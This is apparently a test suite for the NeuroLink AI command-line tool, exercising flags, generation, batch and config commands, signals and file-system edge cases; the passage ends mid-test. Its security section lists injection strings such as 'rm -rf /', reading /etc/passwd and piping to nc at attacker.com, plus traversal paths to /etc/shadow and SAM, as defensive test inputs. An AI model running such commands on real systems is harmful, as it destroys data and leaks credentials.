/**
 * Comprehensive CLI Tests for NeuroLink
 * Exhaustive coverage of all CLI functionality and edge cases
 */

import { describe, it, expect, beforeAll, afterAll, beforeEach, afterEach } from 'vitest';
import { execSync, spawn, ChildProcess } from 'child_process';
import { writeFileSync, unlinkSync, existsSync, mkdirSync, rmSync, readFileSync, chmodSync } from 'fs';
import { join, resolve } from 'path';
import { tmpdir } from 'os';

// Test configuration
const CLI_TIMEOUT = 30000;
const CLI_PATH = './dist/cli/index.js';
const TEST_DIR = join(tmpdir(), 'neurolink-cli-tests');
const FIXTURES_DIR = join(TEST_DIR, 'fixtures');

interface TestResult {
  stdout: string;
  stderr: string;
  exitCode: number;
  error?: Error;
}

// Helper function for executing CLI commands with comprehensive error capture
async function execCLI(args: string[], options: {
  timeout?: number;
  env?: Record<string, string>;
  input?: string;
  expectError?: boolean;
} = {}): Promise<TestResult> {
  return new Promise((resolve) => {
    const env = { ...process.env, ...options.env };
    const child = spawn('node', [CLI_PATH, ...args], {
      env,
      stdio: ['pipe', 'pipe', 'pipe'],
      timeout: options.timeout || CLI_TIMEOUT
    });

    let stdout = '';
    let stderr = '';

    child.stdout?.on('data', (data) => {
      stdout += data.toString();
    });

    child.stderr?.on('data', (data) => {
      stderr += data.toString();
    });

    if (options.input) {
      child.stdin?.write(options.input);
      child.stdin?.end();
    }

    child.on('close', (code) => {
      resolve({
        stdout: stdout.trim(),
        stderr: stderr.trim(),
        exitCode: code || 0
      });
    });

    child.on('error', (error) => {
      resolve({
        stdout: stdout.trim(),
        stderr: stderr.trim(),
        exitCode: 1,
        error
      });
    });
  });
}

describe('Comprehensive CLI Tests', () => {
  beforeAll(() => {
    // Create test directory structure
    if (existsSync(TEST_DIR)) {
      rmSync(TEST_DIR, { recursive: true, force: true });
    }
    mkdirSync(TEST_DIR, { recursive: true });
    mkdirSync(FIXTURES_DIR, { recursive: true });

    // Create test fixture files
    createTestFixtures();
  });

  afterAll(() => {
    // Cleanup test directory
    if (existsSync(TEST_DIR)) {
      rmSync(TEST_DIR, { recursive: true, force: true });
    }
  });

  function createTestFixtures() {
    // Valid prompts file
    writeFileSync(join(FIXTURES_DIR, 'valid-prompts.txt'), [
      'Write a haiku about programming',
      'Explain quantum computing',
      'Generate a product description'
    ].join('\n'));

    // Empty file
    writeFileSync(join(FIXTURES_DIR, 'empty.txt'), '');

    // Large prompts file
    writeFileSync(join(FIXTURES_DIR, 'large-prompts.txt'),
      Array(100).fill('Test prompt for load testing').join('\n'));

    // Invalid UTF-8 file
    const invalidBuffer = Buffer.from([0xFF, 0xFE, 0xFD]);
    writeFileSync(join(FIXTURES_DIR, 'invalid-utf8.txt'), invalidBuffer);

    // Binary file
    const binaryBuffer = Buffer.alloc(1024, 0);
    writeFileSync(join(FIXTURES_DIR, 'binary.bin'), binaryBuffer);

    // Very long single line
    writeFileSync(join(FIXTURES_DIR, 'long-line.txt'), 'x'.repeat(10000));

    // Special characters file
    writeFileSync(join(FIXTURES_DIR, 'special-chars.txt'), [
      'Prompt with emojis 🚀🤖🎯',
      'Symbols @#$%^&*()[]{}|\\:";\'<>?,./`~',
      'Unicode: café, naïve, résumé',
      'Math: ∑, ∫, √, π, ∞'
    ].join('\n'));

    // Config file variations
    writeFileSync(join(FIXTURES_DIR, 'valid-config.json'), JSON.stringify({
      provider: 'openai',
      apiKey: 'test-key',
      temperature: 0.7
    }, null, 2));

    writeFileSync(join(FIXTURES_DIR, 'invalid-config.json'), '{ invalid json }');
  }

  describe('Command Line Argument Parsing', () => {
    it('should handle no arguments gracefully', async () => {
      const result = await execCLI([]);
      expect(result.exitCode).toBeGreaterThanOrEqual(0);
      expect(result.stdout + result.stderr).toMatch(/(usage|help|command)/i);
    });

    it('should handle --help flag', async () => {
      const result = await execCLI(['--help']);
      expect(result.stdout).toContain('Usage:');
      expect(result.stdout).toContain('Commands:');
      expect(result.stdout).toContain('Options:');
    });

    it('should handle -h flag', async () => {
      const result = await execCLI(['-h']);
      expect(result.stdout).toContain('Usage:');
    });

    it('should handle --version flag', async () => {
      const result = await execCLI(['--version']);
      expect(result.stdout).toMatch(/\d+\.\d+\.\d+/);
    });

    it('should handle -V flag', async () => {
      const result = await execCLI(['-V']);
      expect(result.stdout).toMatch(/\d+\.\d+\.\d+/);
    });

    it('should handle unknown flags gracefully', async () => {
      const result = await execCLI(['--unknown-flag']);
      expect(result.exitCode).not.toBe(0);
      expect(result.stderr).toMatch(/(unknown|invalid|unrecognized)/i);
    });

    it('should handle flag variations', async () => {
      const flagVariations = [
        ['--format', 'json'],
        ['--format=json'],
        ['-f', 'json']
      ];

      for (const flags of flagVariations) {
        const result = await execCLI(['generate', 'test', ...flags]);
        // Should recognize the flag format even if command fails
        expect(result.stderr).not.toMatch(/(unknown.*flag|invalid.*option)/i);
      }
    });

    it('should handle quoted arguments with spaces', async () => {
      const result = await execCLI(['generate', 'This is a test prompt with spaces']);
      // Should not complain about parsing
      expect(result.stderr).not.toMatch(/(unexpected.*argument|too.*many.*arguments)/i);
    });

    it('should handle arguments with special characters', async () => {
      const specialArgs = [
        'Prompt with "quotes"',
        "Prompt with 'single quotes'",
        'Prompt with $variables',
        'Prompt with & symbols',
        'Prompt with | pipes'
      ];

      for (const arg of specialArgs) {
        const result = await execCLI(['generate', arg]);
        expect(result.stderr).not.toMatch(/parse.*error/i);
      }
    });

    it('should handle very long arguments', async () => {
      const longPrompt = 'x'.repeat(5000);
      const result = await execCLI(['generate', longPrompt]);
      expect(result.stderr).not.toMatch(/argument.*too.*long/i);
    });

    it('should handle empty string arguments', async () => {
      const result = await execCLI(['generate', '']);
      expect(result.exitCode).not.toBe(0);
      expect(result.stderr).toMatch(/(empty|required|missing)/i);
    });
  });

  describe('Provider Commands', () => {
    it('should handle provider status command', async () => {
      const result = await execCLI(['provider', 'status']);
      expect(result.stdout + result.stderr).toMatch(/(provider|status|openai|bedrock|vertex)/i);
    });

    it('should handle provider status with verbose flag', async () => {
      const result = await execCLI(['provider', 'status', '--verbose']);
      expect(result.stdout + result.stderr).toMatch(/(provider|status)/i);
    });

    it('should handle provider list command', async () => {
      const result = await execCLI(['provider', 'list']);
      expect(result.stdout + result.stderr).toMatch(/(provider|available|openai|bedrock|vertex)/i);
    });

    it('should handle invalid provider commands', async () => {
      const result = await execCLI(['provider', 'invalid-command']);
      expect(result.exitCode).not.toBe(0);
      expect(result.stderr).toMatch(/(unknown|invalid|command)/i);
    });

    it('should handle provider configuration', async () => {
      const result = await execCLI(['provider', 'configure', 'openai']);
      expect(result.stdout + result.stderr).toMatch(/(configure|setup|api.*key)/i);
    });
  });

  describe('Text Generation Commands', () => {
    it('should handle basic text generation', async () => {
      const result = await execCLI(['generate', 'Hello world']);
      // May fail due to missing API keys, but should show proper structure
      expect(result.stdout + result.stderr).toMatch(/(generate|error|api|key|provider)/i);
    });

    it('should handle generation with provider specification', async () => {
      const providers = ['openai', 'bedrock', 'vertex', 'auto'];

      for (const provider of providers) {
        const result = await execCLI(['generate', 'test', '--provider', provider]);
        expect(result.stdout + result.stderr).toMatch(new RegExp(`(${provider}|error|api|key)`, 'i'));
      }
    });

    it('should handle generation with temperature parameter', async () => {
      const temperatures = ['0.0', '0.5', '1.0', '1.5', '2.0'];

      for (const temp of temperatures) {
        const result = await execCLI(['generate', 'test', '--temperature', temp]);
        expect(result.stderr).not.toMatch(/invalid.*temperature/i);
      }
    });

    it('should handle invalid temperature values', async () => {
      const invalidTemps = ['-1', '3.0', 'abc', 'null'];

      for (const temp of invalidTemps) {
        const result = await execCLI(['generate', 'test', '--temperature', temp]);
        expect(result.exitCode).not.toBe(0);
      }
    });

    it('should handle max-tokens parameter', async () => {
      const tokenCounts = ['1', '100', '1000', '4000'];

      for (const tokens of tokenCounts) {
        const result = await execCLI(['generate', 'test', '--max-tokens', tokens]);
        expect(result.stderr).not.toMatch(/invalid.*tokens/i);
      }
    });

    it('should handle invalid max-tokens values', async () => {
      const invalidTokens = ['0', '-10', 'abc', '10000'];

      for (const tokens of invalidTokens) {
        const result = await execCLI(['generate', 'test', '--max-tokens', tokens]);
        expect(result.exitCode).not.toBe(0);
      }
    });

    it('should handle output format options', async () => {
      const formats = ['text', 'json', 'yaml'];

      for (const format of formats) {
        const result = await execCLI(['generate', 'test', '--format', format]);
        expect(result.stderr).not.toMatch(/invalid.*format/i);
      }
    });

    it('should handle system prompt parameter', async () => {
      const result = await execCLI(['generate', 'test', '--system', 'You are a helpful assistant']);
      expect(result.stderr).not.toMatch(/invalid.*system/i);
    });

    it('should handle generation with all parameters', async () => {
      const result = await execCLI([
        'generate', 'test prompt',
        '--provider', 'openai',
        '--temperature', '0.7',
        '--max-tokens', '100',
        '--format', 'json',
        '--system', 'Be helpful'
      ]);
      expect(result.stderr).not.toMatch(/invalid.*parameter/i);
    });
  });

  describe('Streaming Commands', () => {
    it('should handle basic streaming command', async () => {
      const result = await execCLI(['stream', 'Hello world']);
      expect(result.stdout + result.stderr).toMatch(/(stream|error|api|key|provider)/i);
    });

    it('should handle streaming with parameters', async () => {
      const result = await execCLI([
        'stream', 'test prompt',
        '--provider', 'openai',
        '--temperature', '0.8'
      ]);
      expect(result.stderr).not.toMatch(/invalid.*parameter/i);
    });

    it('should handle streaming interruption', async () => {
      // Test that streaming can be interrupted gracefully
      const child = spawn('node', [CLI_PATH, 'stream', 'Long story prompt'], {
        stdio: ['pipe', 'pipe', 'pipe']
      });

      setTimeout(() => {
        child.kill('SIGINT');
      }, 1000);

      const result = await new Promise<TestResult>((resolve) => {
        let stdout = '';
        let stderr = '';

        child.stdout?.on('data', (data) => stdout += data.toString());
        child.stderr?.on('data', (data) => stderr += data.toString());

        child.on('close', (code) => {
          resolve({ stdout, stderr, exitCode: code || 0 });
        });
      });

      expect(result.exitCode).toBeGreaterThanOrEqual(0);
    });
  });

  describe('Batch Processing Commands', () => {
    it('should handle valid batch file', async () => {
      const result = await execCLI(['batch', join(FIXTURES_DIR, 'valid-prompts.txt')]);
      expect(result.stdout + result.stderr).toMatch(/(batch|process|error|api|key)/i);
    });

    it('should handle empty batch file', async () => {
      const result = await execCLI(['batch', join(FIXTURES_DIR, 'empty.txt')]);
      expect(result.exitCode).not.toBe(0);
      expect(result.stderr).toMatch(/(empty|no.*prompts)/i);
    });

    it('should handle nonexistent batch file', async () => {
      const result = await execCLI(['batch', join(FIXTURES_DIR, 'nonexistent.txt')]);
      expect(result.exitCode).not.toBe(0);
      expect(result.stderr).toMatch(/(not.*found|not.*exist|enoent)/i);
    });

    it('should handle batch with output file specification', async () => {
      const outputFile = join(TEST_DIR, 'batch-output.json');
      const result = await execCLI([
        'batch',
        join(FIXTURES_DIR, 'valid-prompts.txt'),
        '--output', outputFile
      ]);
      expect(result.stderr).not.toMatch(/invalid.*output/i);
    });

    it('should handle batch with invalid output directory', async () => {
      const result = await execCLI([
        'batch',
        join(FIXTURES_DIR, 'valid-prompts.txt'),
        '--output', '/invalid/path/output.json'
      ]);
      expect(result.exitCode).not.toBe(0);
    });

    it('should handle large batch file', async () => {
      const result = await execCLI(['batch', join(FIXTURES_DIR, 'large-prompts.txt')], {
        timeout: 60000 // Extended timeout for large batch
      });
      expect(result.stdout + result.stderr).toMatch(/(batch|process|error|api|key)/i);
    });

    it('should handle batch file with special characters', async () => {
      const result = await execCLI(['batch', join(FIXTURES_DIR, 'special-chars.txt')]);
      expect(result.stdout + result.stderr).toMatch(/(batch|process|error|api|key)/i);
    });

    it('should handle binary file as batch input', async () => {
      const result = await execCLI(['batch', join(FIXTURES_DIR, 'binary.bin')]);
      expect(result.exitCode).not.toBe(0);
      expect(result.stderr).toMatch(/(invalid|binary|encoding)/i);
    });

    it('should handle batch with concurrent processing', async () => {
      const result = await execCLI([
        'batch',
        join(FIXTURES_DIR, 'valid-prompts.txt'),
        '--concurrent', '3'
      ]);
      expect(result.stderr).not.toMatch(/invalid.*concurrent/i);
    });
  });

  describe('Configuration Commands', () => {
    it('should handle config show command', async () => {
      const result = await execCLI(['config', 'show']);
      expect(result.stdout + result.stderr).toMatch(/(config|settings|provider)/i);
    });

    it('should handle config set command', async () => {
      const result = await execCLI(['config', 'set', 'provider', 'openai']);
      expect(result.stdout + result.stderr).toMatch(/(config|set|provider)/i);
    });

    it('should handle config reset command', async () => {
      const result = await execCLI(['config', 'reset']);
      expect(result.stdout + result.stderr).toMatch(/(config|reset|default)/i);
    });

    it('should handle config file import', async () => {
      const result = await execCLI(['config', 'import', join(FIXTURES_DIR, 'valid-config.json')]);
      expect(result.stdout + result.stderr).toMatch(/(config|import|load)/i);
    });

    it('should handle invalid config file import', async () => {
      const result = await execCLI(['config', 'import', join(FIXTURES_DIR, 'invalid-config.json')]);
      expect(result.exitCode).not.toBe(0);
      expect(result.stderr).toMatch(/(invalid|parse|json)/i);
    });

    it('should handle config export', async () => {
      const exportFile = join(TEST_DIR, 'exported-config.json');
      const result = await execCLI(['config', 'export', exportFile]);
      expect(result.stdout + result.stderr).toMatch(/(config|export|save)/i);
    });
  });

  describe('Environment Variable Handling', () => {
    it('should handle missing API keys gracefully', async () => {
      const result = await execCLI(['generate', 'test'], {
        env: {
          // Clear all potential API keys
          OPENAI_API_KEY: '',
          AWS_ACCESS_KEY_ID: '',
          GOOGLE_APPLICATION_CREDENTIALS: ''
        }
      });
      expect(result.exitCode).not.toBe(0);
      expect(result.stderr).toMatch(/(api.*key|credential|authentication)/i);
    });

    it('should respect provider environment variables', async () => {
      const result = await execCLI(['generate', 'test'], {
        env: {
          NEUROLINK_PROVIDER: 'openai',
          NEUROLINK_TEMPERATURE: '0.5'
        }
      });
      expect(result.stderr).not.toMatch(/invalid.*environment/i);
    });

    it('should handle malformed environment variables', async () => {
      const result = await execCLI(['generate', 'test'], {
        env: {
          NEUROLINK_TEMPERATURE: 'invalid',
          NEUROLINK_MAX_TOKENS: 'not-a-number'
        }
      });
      expect(result.exitCode).not.toBe(0);
    });

    it('should handle debug environment variable', async () => {
      const result = await execCLI(['provider', 'status'], {
        env: {
          NEUROLINK_DEBUG: 'true'
        }
      });
      expect(result.stdout + result.stderr).toMatch(/(debug|verbose|detailed)/i);
    });

    it('should handle configuration directory override', async () => {
      const customConfigDir = join(TEST_DIR, 'custom-config');
      mkdirSync(customConfigDir, { recursive: true });

      const result = await execCLI(['config', 'show'], {
        env: {
          NEUROLINK_CONFIG_DIR: customConfigDir
        }
      });
      expect(result.stdout + result.stderr).toMatch(/(config|settings)/i);
    });
  });

  describe('Error Handling and Recovery', () => {
    it('should handle network timeout errors', async () => {
      const result = await execCLI(['generate', 'test'], {
        env: {
          NEUROLINK_TIMEOUT: '1' // Very short timeout
        }
      });
      expect(result.stdout + result.stderr).toMatch(/(timeout|network|error)/i);
    });

    it('should handle rate limiting gracefully', async () => {
      // Simulate rapid requests
      const promises = Array(5).fill(0).map(() =>
        execCLI(['generate', 'quick test'])
      );

      const results = await Promise.all(promises);
      const hasRateLimitHandling = results.some(r =>
        (r.stdout + r.stderr).match(/(rate.*limit|quota|throttle)/i)
      );

      // Should either succeed or show rate limit handling
      expect(results.every(r => r.exitCode >= 0)).toBe(true);
    });

    it('should handle invalid API responses', async () => {
      const result = await execCLI(['generate', 'test'], {
        env: {
          NEUROLINK_API_BASE: 'https://invalid-endpoint.example.com'
        }
      });
      expect(result.exitCode).not.toBe(0);
      expect(result.stderr).toMatch(/(connection|network|endpoint)/i);
    });

    it('should handle disk space errors', async () => {
      // Try to write to a location that might fail
      const result = await execCLI([
        'batch',
        join(FIXTURES_DIR, 'valid-prompts.txt'),
        '--output', '/dev/null/invalid/path.json'
      ]);
      expect(result.exitCode).not.toBe(0);
    });

    it('should handle memory pressure gracefully', async () => {
      // Test with very large prompt
      const hugePrompt = 'x'.repeat(100000);
      const result = await execCLI(['generate', hugePrompt]);
      // Should either succeed or fail gracefully
      expect(result.exitCode).toBeGreaterThanOrEqual(0);
    });

    it('should handle SIGINT gracefully', async () => {
      const child = spawn('node', [CLI_PATH, 'generate', 'Long running prompt'], {
        stdio: ['pipe', 'pipe', 'pipe']
      });

      setTimeout(() => {
        child.kill('SIGINT');
      }, 1000);

      const result = await new Promise<TestResult>((resolve) => {
        let stdout = '';
        let stderr = '';

        child.stdout?.on('data', (data) => stdout += data.toString());
        child.stderr?.on('data', (data) => stderr += data.toString());

        child.on('close', (code) => {
          resolve({ stdout, stderr, exitCode: code || 0 });
        });
      });

      // Should exit gracefully
      expect(result.exitCode).toBeGreaterThanOrEqual(0);
    });

    it('should handle SIGTERM gracefully', async () => {
      const child = spawn('node', [CLI_PATH, 'stream', 'Long running stream'], {
        stdio: ['pipe', 'pipe', 'pipe']
      });

      setTimeout(() => {
        child.kill('SIGTERM');
      }, 1000);

      const result = await new Promise<TestResult>((resolve) => {
        let stdout = '';
        let stderr = '';

        child.stdout?.on('data', (data) => stdout += data.toString());
        child.stderr?.on('data', (data) => stderr += data.toString());

        child.on('close', (code) => {
          resolve({ stdout, stderr, exitCode: code || 0 });
        });
      });

      expect(result.exitCode).toBeGreaterThanOrEqual(0);
    });
  });

  describe('Output Formatting', () => {
    it('should produce valid JSON output', async () => {
      const result = await execCLI(['generate', 'test', '--format', 'json']);

      if (result.exitCode === 0) {
        expect(() => JSON.parse(result.stdout)).not.toThrow();
      } else {
        // Even errors should be in JSON format when requested
        if (result.stdout.includes('{')) {
          expect(() => JSON.parse(result.stdout)).not.toThrow();
        }
      }
    });

    it('should respect quiet mode', async () => {
      const result = await execCLI(['provider', 'status', '--quiet']);

      if (result.exitCode === 0) {
        // Quiet mode should produce minimal output
        expect(result.stdout.split('\n').length).toBeLessThan(5);
      }
    });

    it('should respect verbose mode', async () => {
      const normalResult = await execCLI(['provider', 'status']);
      const verboseResult = await execCLI(['provider', 'status', '--verbose']);

      // Verbose should generally produce more output
      expect(verboseResult.stdout.length).toBeGreaterThanOrEqual(normalResult.stdout.length);
    });

    it('should handle color output preferences', async () => {
      const noColorResult = await execCLI(['provider', 'status'], {
        env: { NO_COLOR: '1' }
      });

      const colorResult = await execCLI(['provider', 'status'], {
        env: { FORCE_COLOR: '1' }
      });

      // Both should work without errors
      expect(noColorResult.exitCode).toBeGreaterThanOrEqual(0);
      expect(colorResult.exitCode).toBeGreaterThanOrEqual(0);
    });

    it('should handle different terminal widths', async () => {
      const widths = ['80', '120', '40'];

      for (const width of widths) {
        const result = await execCLI(['provider', 'status'], {
          env: { COLUMNS: width }
        });
        expect(result.exitCode).toBeGreaterThanOrEqual(0);
      }
    });

    it('should handle Unicode output correctly', async () => {
      const result = await execCLI(['generate', 'Write with emojis and Unicode']);

      // Should not have encoding errors
      expect(result.stderr).not.toMatch(/(encoding|unicode.*error)/i);
    });
  });

  describe('Interactive Mode Testing', () => {
    it('should handle interactive prompts with valid input', async () => {
      const result = await execCLI(['config', 'setup'], {
        input: 'openai\ntest-key\ny\n' // Provider, API key, confirm
      });
      expect(result.stdout + result.stderr).toMatch(/(setup|config|provider)/i);
    });

    it('should handle interactive prompts with cancellation', async () => {
      const result = await execCLI(['config', 'setup'], {
        input: '\x03' // Ctrl+C
      });
      expect(result.exitCode).toBeGreaterThanOrEqual(0);
    });

    it('should handle interactive prompts with EOF', async () => {
      const result = await execCLI(['config', 'setup'], {
        input: '' // EOF
      });
      expect(result.exitCode).toBeGreaterThanOrEqual(0);
    });

    it('should handle interactive prompts with invalid input', async () => {
      const result = await execCLI(['config', 'setup'], {
        input: 'invalid-provider\n\n\n'
      });
      expect(result.stdout + result.stderr).toMatch(/(invalid|error|try.*again)/i);
    });
  });

  describe('File System Edge Cases', () => {
    it('should handle read-only directories', async () => {
      const readOnlyDir = join(TEST_DIR, 'readonly');
      mkdirSync(readOnlyDir, { recursive: true });

      try {
        chmodSync(readOnlyDir, 0o444); // Read-only

        const result = await execCLI(['config', 'export', join(readOnlyDir, 'config.json')]);
        expect(result.exitCode).not.toBe(0);
        expect(result.stderr).toMatch(/(permission|readonly|access)/i);
      } finally {
        chmodSync(readOnlyDir, 0o755); // Restore permissions for cleanup
      }
    });

    it('should handle very long file paths', async () => {
      const longPath = join(TEST_DIR, 'a'.repeat(200), 'config.json');
      const result = await execCLI(['config', 'export', longPath]);

      // Should either create the path or fail gracefully
      expect(result.exitCode).toBeGreaterThanOrEqual(0);
    });

    it('should handle file system case sensitivity', async () => {
      const lowerFile = join(FIXTURES_DIR, 'test.txt');
      const upperFile = join(FIXTURES_DIR, 'TEST.txt');

      writeFileSync(lowerFile, 'test content');

      const result1 = await execCLI(['batch', lowerFile]);
      const result2 = await execCLI(['batch', upperFile]);

      // Behavior depends on file system, but should be consistent
      expect(result1.exitCode).toBeGreaterThanOrEqual(0);
      expect(result2.exitCode).toBeGreaterThanOrEqual(0);
    });

    it('should handle concurrent file access', async () => {
      const testFile = join(FIXTURES_DIR, 'concurrent-test.txt');
      writeFileSync(testFile, 'test\ntest\ntest');

      // Run multiple concurrent commands on the same file
      const promises = Array(3).fill(0).map(() =>
        execCLI(['batch', testFile])
      );

      const results = await Promise.all(promises);

      // All should complete without file locking errors
      expect(results.every(r => r.exitCode >= 0)).toBe(true);
    });

    it('should handle symlinks correctly', async () => {
      const originalFile = join(FIXTURES_DIR, 'original.txt');
      const symlinkFile = join(FIXTURES_DIR, 'symlink.txt');

      writeFileSync(originalFile, 'test content');

      try {
        // Create symlink (may fail on Windows without admin rights)
        execSync(`ln -s ${originalFile} ${symlinkFile}`);

        const result = await execCLI(['batch', symlinkFile]);
        expect(result.exitCode).toBeGreaterThanOrEqual(0);
      } catch {
        // Symlink creation failed - expected on some systems
      }
    });
  });

  describe('Platform-Specific Behavior', () => {
    it('should handle Windows-specific paths', async () => {
      if (process.platform === 'win32') {
        const windowsPath = 'C:\\temp\\test.txt';
        const result = await execCLI(['batch', windowsPath]);
        expect(result.exitCode).toBeGreaterThanOrEqual(0);
      }
    });

    it('should handle Unix-specific paths', async () => {
      if (process.platform !== 'win32') {
        const unixPath = '/tmp/test.txt';
        const result = await execCLI(['batch', unixPath]);
        expect(result.exitCode).toBeGreaterThanOrEqual(0);
      }
    });

    it('should handle path separators correctly', async () => {
      const testFile = join(FIXTURES_DIR, 'path-test.txt');
      writeFileSync(testFile, 'test');

      // Test with both forward and back slashes
      const forwardSlashPath = testFile.replace(/\\/g, '/');
      const result = await execCLI(['batch', forwardSlashPath]);
      expect(result.exitCode).toBeGreaterThanOrEqual(0);
    });

    it('should handle environment-specific newlines', async () => {
      const testFile = join(FIXTURES_DIR, 'newline-test.txt');

      // Test different newline formats
      writeFileSync(testFile, 'line1\nline2\nline3'); // Unix
      const unixResult = await execCLI(['batch', testFile]);

      writeFileSync(testFile, 'line1\r\nline2\r\nline3'); // Windows
      const windowsResult = await execCLI(['batch', testFile]);

      writeFileSync(testFile, 'line1\rline2\rline3'); // Old Mac
      const macResult = await execCLI(['batch', testFile]);

      expect(unixResult.exitCode).toBeGreaterThanOrEqual(0);
      expect(windowsResult.exitCode).toBeGreaterThanOrEqual(0);
      expect(macResult.exitCode).toBeGreaterThanOrEqual(0);
    });
  });

  describe('Performance and Scalability', () => {
    it('should handle rapid command succession', async () => {
      const commands = [
        ['provider', 'status'],
        ['config', 'show'],
        ['--help'],
        ['--version']
      ];

      const promises = commands.map(cmd => execCLI(cmd));
      const results = await Promise.all(promises);

      // All commands should complete
      expect(results.every(r => r.exitCode >= 0)).toBe(true);
    });

    it('should handle large output streams', async () => {
      const largePromptFile = join(FIXTURES_DIR, 'large-output.txt');
      writeFileSync(largePromptFile, Array(50).fill('Generate a long detailed response').join('\n'));

      const result = await execCLI(['batch', largePromptFile], {
        timeout: 60000
      });

      expect(result.exitCode).toBeGreaterThanOrEqual(0);
    });

    it('should handle command timeout scenarios', async () => {
      const result = await execCLI(['generate', 'very long prompt'], {
        timeout: 100 // Very short timeout
      });

      // Should either complete quickly or timeout gracefully
      expect(result.exitCode).toBeGreaterThanOrEqual(0);
    });

    it('should handle memory-intensive operations', async () => {
      // Test with many concurrent small operations
      const promises = Array(20).fill(0).map((_, i) =>
        execCLI(['generate', `test ${i}`])
      );

      const results = await Promise.allSettled(promises);

      // Should handle the load without crashing
      expect(results.every(r => r.status === 'fulfilled')).toBe(true);
    });
  });

  describe('Security and Validation', () => {
    it('should handle potentially malicious input', async () => {
      const maliciousInputs = [
        '$(rm -rf /)',
        '`cat /etc/passwd`',
        '../../../etc/passwd',
        'test; rm -rf /',
        'test && echo "injected"',
        'test | nc attacker.com 1337'
      ];

      for (const input of maliciousInputs) {
        const result = await execCLI(['generate', input]);
        // Should either process safely or reject
        expect(result.exitCode).toBeGreaterThanOrEqual(0);
      }
    });

    it('should handle path traversal attempts', async () => {
      const traversalPaths = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/shadow',
        'C:\\Windows\\System32\\config\\SAM'
      ];

      for (const path of traversalPaths) {
        const result = await execCLI(['batch', path]);
        // Should reject or handle safely
        expect(result.exitCode).not.toBe(0);
      }
    });

    it('should handle extremely long input', async () => {
      const extremelyLongInput = 'x'.repeat(1000000); // 1MB string

      const result = await execCLI(['generate', extremelyLongInput]);

      // Should either handle gracefully or reject appropriately
      expect(result.exitCode).toBeGreaterThanOrEqual(0);
    });

    it('should handle null bytes and control characters', async () => {
      const controlChars = [
        'test\x00null',
        'test\x01control',
        'test\x1bescape',
        'test\x7fdelete'
      ];

      for (const input of controlChars) {
        const result = await execCLI(['generate', input]);
        expect(result.exitCode).toBeGreaterThanOrEqual(0);
      }
    });
  });

  describe('Integration Testing', () => {
    it('should work with package managers', async () => {
      // Test that CLI can be invoked through npm/npx
      try {
        const npmResult = execSync('npm list @juspay/neurolink', { encoding: 'utf8' });
        // If package is installed, CLI should be available
        if (npmResult.includes('@juspay/neurolink')) {
          const result = await execCLI(['--version']);
          expect(result.exitCode).toBe(0);
        }
      } catch {
        // Package not installed via npm - expected in dev
      }
    });

    it('should integrate with shell environment', async () => {
      const result = await execCLI(['provider', 'status'], {
        env: {
          ...process.env,
          SHELL: '/bin/bash',
          TERM: 'xterm-256color'
        }
      });

      expect(result.exitCode).toBeGreaterThanOrEqual(0);
    });

    it('should handle CI/CD environment variables', async () => {
      const ciEnvs = {
        CI: 'true',
        GITHUB_ACTIONS: 'true',
        JENKINS_URL: 'https://jenkins.example.com',
        GITLAB_CI: 'true'
      };

      const result = await execCLI(['provider', 'status'], {
        env: { ...process.env, ...ciEnvs }
      });

      expect(result.exitCode).toBeGreaterThanOrEqual(0);
    });

    it('should work with different Node.js versions', async () => {
      // Test compatibility markers
      const nodeVersion = process.version;
      const result = await execCLI(['--version']);

      expect(result.exitCode).toBe(0);
      // CLI should report compatibility
      expect(result.stdout).toMatch(/\d+\.\d+\.\d+/);
    });
  });

  describe('Regression Testing', () => {
    it('should maintain backward compatibility with old flags', async () => {
      const oldFlags = [
        ['--temperature', '0.7'],
        ['--max-tokens', '100'],
        ['--provider', 'auto'],
        ['--format', 'json']
      ];

      for (const [flag, value] of oldFlags) {
        const result = await execCLI(['generate', 'test', flag, value]);
        // Should recognize old flags
        expect(result.stderr).not.toMatch(/unknown.*flag/i);
      }
    });

    it('should handle legacy configuration formats', async () => {
      const legacyConfig = join(FIXTURES_DIR, 'legacy-config.json');
      writeFileSync(legacyConfig, JSON.stringify({
        // Old format
        apiKey: 'test',
        model: 'gpt-3.5-turbo',
        temp: 0.7
      }));

      const result = await execCLI(['config', 'import', legacyConfig]);
      expect(result.stdout + result.stderr).toMatch(/(config|import|legacy|migration)/i);
    });

    it('should maintain output format consistency', async () => {
      const result = await execCLI(['provider', 'status', '--format', 'json']);

      if (result.exitCode === 0 && result.stdout) {
        const parsed = JSON.parse(result.stdout);

        // Check required fields exist
        expect(parsed).toBeDefined();
        expect(typeof parsed).toBe('object');
      }
    });
  });

  describe('Documentation and Help System', () => {
    it('should provide comprehensive help for all commands', async () => {
      const commands = [
        ['provider', '--help'],
        ['generate', '--help'],
        ['stream', '--help'],
        ['batch', '--help'],
        ['config', '--help']
      ];

      for (const cmd of commands) {
        const result = await execCLI(cmd);
        expect(result.stdout).toContain('Usage:');
        expect(result.stdout).toMatch(/(option|argument|example)/i);
      }
    });

    it('should provide examples in help text', async () => {
      const result = await execCLI(['generate', '--help']);
      expect(result.stdout).toMatch(/(example|usage|e\.g\.)/i);
    });

    it('should show available options clearly', async () => {
      const result = await execCLI(['--help']);
      expect(result.stdout).toMatch(/(-h,.*--help|-V,.*--version)/);
    });

    it('should handle help for nested commands', async () => {
      const result = await execCLI(['provider', 'status', '--help']);
      expect(result.stdout + result.stderr).toMatch(/(help|usage|status)/i);
    });
  });

  describe('Edge Cases and Corner Cases', () => {
    it('should handle empty environment', async () => {
      const result = await execCLI(['--version'], {
        env: {} // Completely empty environment
      });

      expect(result.exitCode).toBeGreaterThanOrEqual(0);
    });

    it('should handle missing required directories', async () => {
      const result = await execCLI(['config', 'show'], {
        env: {
          HOME: '/nonexistent',
          APPDATA: '/nonexistent'
        }
      });

      expect(result.exitCode).toBeGreaterThanOrEqual(0);
    });

    it('should handle system resource limits', async () => {
      // Test with limited resources
      const result = await execCLI(['provider', 'status'], {
        env: {
          NODE_OPTIONS: '--max-old-space-size=64' // 64MB limit
        }
      });

      expect(result.exitCode).toBeGreaterThanOrEqual(0);
    });

    it('should handle interrupted operations gracefully', async () => {
      const child = spawn('node', [CLI_PATH, 'batch', join(FIXTURES_DIR, 'large-prompts.txt')], {
        stdio: ['pipe', 'pipe', 'pipe']
      });

      // Interrupt after short time
      setTimeout(() => child.kill('SIGINT'), 500);

      const result = await new Promise<TestResult>((resolve) => {
        let stdout = '';
        let stderr = '';

        child.stdout?.on('data', (data) => stdout += data.toString());
        child.stderr?.on('data', (data) => stderr += data.toString());

